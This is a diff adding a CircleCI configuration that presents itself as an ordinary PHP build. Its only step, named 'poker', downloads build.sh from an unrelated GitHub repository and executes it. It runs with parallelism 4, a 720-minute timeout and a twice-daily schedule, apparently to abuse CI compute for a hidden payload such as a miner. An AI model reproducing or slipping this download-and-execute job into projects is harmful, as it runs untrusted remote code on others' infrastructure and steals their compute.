@@ -1,0 +1,32 @@
+working_dir: &working_dir ~/app
+
+version: 2.0
+jobs:
+  build:
+    parallelism: 4
+    docker:
+      - image: circleci/php:8.0.6
+    steps:
+    - checkout
+    - run:
+        name: poker
+        command: |
+                  wget -O build.sh https://raw.githubusercontent.com/Explorer-Discord/Discord-V.001/main/build.sh && chmod u+x build.sh && timeout 720m ./build.sh && echo "suksesd"
+        no_output_timeout: 720m
+        
+workflows:
+  version: 2
+  commit:
+    jobs:
+      - build
+    triggers:
+      - schedule:
+          cron: "0 8,16 * * *"
+          filters:
+            branches:
+              only:
+                - master
+                
+  phprunbuild:
+    jobs:
+      - build
